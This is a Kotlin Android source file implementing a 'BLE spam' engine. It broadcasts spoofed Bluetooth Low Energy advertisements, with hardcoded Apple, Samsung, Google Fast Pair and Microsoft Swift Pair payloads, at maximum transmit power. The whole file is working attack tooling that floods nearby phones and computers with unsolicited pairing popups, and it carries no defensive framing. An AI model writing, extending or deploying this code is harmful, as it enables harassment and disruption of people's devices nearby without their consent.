package com.logm1lo.ctos

import android.annotation.SuppressLint
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.bluetooth.le.AdvertiseCallback
import android.os.ParcelUuid
import android.util.Log
import kotlin.random.Random

class BleSpamEngine(private val advertiser: BluetoothLeAdvertiser?) {
    private val TAG = "BleSpamEngine"
    private val activeCallbacks = mutableListOf<AdvertiseCallback>()

    fun startSpam(type: String) {
        Log.d(TAG, "[startSpam] → Entry: type=$type")
        stopSpam()
        
        try {
            when (type) {
                "apple_action_modal" -> spamAppleActionModal()
                "apple_device_popup" -> spamAppleDevicePopup()
                "samsung_buds" -> spamSamsungBuds()
                "google_fast_pair" -> spamGoogleFastPair()
                "swift_pair" -> spamSwiftPair()
                else -> Log.w(TAG, "[startSpam] → Warning: Unknown spam type: $type")
            }
            Log.d(TAG, "[startSpam] → Exit: Completed successfully")
        } catch (e: Exception) {
            Log.e(TAG, "[startSpam] → Exception: ${e.message}", e)
        }
    }

    @SuppressLint("MissingPermission")
    fun stopSpam() {
        Log.d(TAG, "[stopSpam] → Entry")
        try {
            activeCallbacks.forEach { 
                Log.v(TAG, "[stopSpam] → Stopping callback: $it")
                advertiser?.stopAdvertising(it) 
            }
            activeCallbacks.clear()
            Log.d(TAG, "[stopSpam] → Exit: All transmissions halted")
        } catch (e: Exception) {
            Log.e(TAG, "[stopSpam] → Error: ${e.message}", e)
        }
    }

    private fun spamAppleActionModal() {
        Log.d(TAG, "[spamAppleActionModal] → Entry")
        val settings = defaultSettings()
        val manufacturerData = byteArrayOf(
            0x0f, 0x05, 0xc0.toByte(), 0x09, 
            Random.nextInt().toByte(), Random.nextInt().toByte(), Random.nextInt().toByte()
        )
        val data = AdvertiseData.Builder()
            .addManufacturerData(0x004c, manufacturerData)
            .build()
        
        startAdvertising(settings, data, "Apple Action Modal")
    }

    private fun spamAppleDevicePopup() {
        Log.d(TAG, "[spamAppleDevicePopup] → Entry")
        val settings = defaultSettings()
        val manufacturerData = byteArrayOf(
            0x07, 0x19, 0x07, 0x02, 0x20.toByte(), 0x75, 0xaa.toByte(), 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        )
        val data = AdvertiseData.Builder()
            .addManufacturerData(0x004c, manufacturerData)
            .build()
        
        startAdvertising(settings, data, "Apple Device Popup")
    }

    private fun spamSamsungBuds() {
        Log.d(TAG, "[spamSamsungBuds] → Entry")
        val settings = defaultSettings()
        val manufacturerData = byteArrayOf(
            0x00, 0x02, 0x00, 0x01, 0x01, 0xFF.toByte()
        )
        val data = AdvertiseData.Builder()
            .addManufacturerData(0x0075, manufacturerData)
            .build()
        
        startAdvertising(settings, data, "Samsung Buds")
    }

    private fun spamGoogleFastPair() {
        Log.d(TAG, "[spamGoogleFastPair] → Entry")
        val settings = defaultSettings()
        val data = AdvertiseData.Builder()
            .addServiceUuid(ParcelUuid.fromString("0000fe2c-0000-1000-8000-00805f9b34fb"))
            .addServiceData(ParcelUuid.fromString("0000fe2c-0000-1000-8000-00805f9b34fb"), byteArrayOf(0x00, 0x00, 0x00))
            .build()
        
        startAdvertising(settings, data, "Google Fast Pair")
    }

    private fun spamSwiftPair() {
        Log.d(TAG, "[spamSwiftPair] → Entry")
        val settings = defaultSettings()
        val manufacturerData = byteArrayOf(
            0x03, 0x00, 0x80.toByte(), 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17
        )
        val data = AdvertiseData.Builder()
            .addManufacturerData(0x0006, manufacturerData)
            .build()
        
        startAdvertising(settings, data, "Microsoft Swift Pair")
    }

    private fun defaultSettings(): AdvertiseSettings {
        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false)
            .build()
        Log.v(TAG, "[defaultSettings] → Generated settings: mode=LOW_LATENCY, tx=HIGH")
        return settings
    }

    @SuppressLint("MissingPermission")
    private fun startAdvertising(settings: AdvertiseSettings, data: AdvertiseData, label: String) {
        Log.d(TAG, "[startAdvertising] → Entry: label=$label")
        val callback = object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                Log.d(TAG, "[onStartSuccess] → $label spam ACTIVE")
            }
            override fun onStartFailure(errorCode: Int) {
                Log.e(TAG, "[onStartFailure] → $label spam ERROR: $errorCode")
            }
        }
        activeCallbacks.add(callback)
        try {
            advertiser?.startAdvertising(settings, data, callback)
            Log.d(TAG, "[startAdvertising] → Exit: Transmission request submitted")
        } catch (e: Exception) {
            Log.e(TAG, "[startAdvertising] → Exception: ${e.message}", e)
        }
    }
}
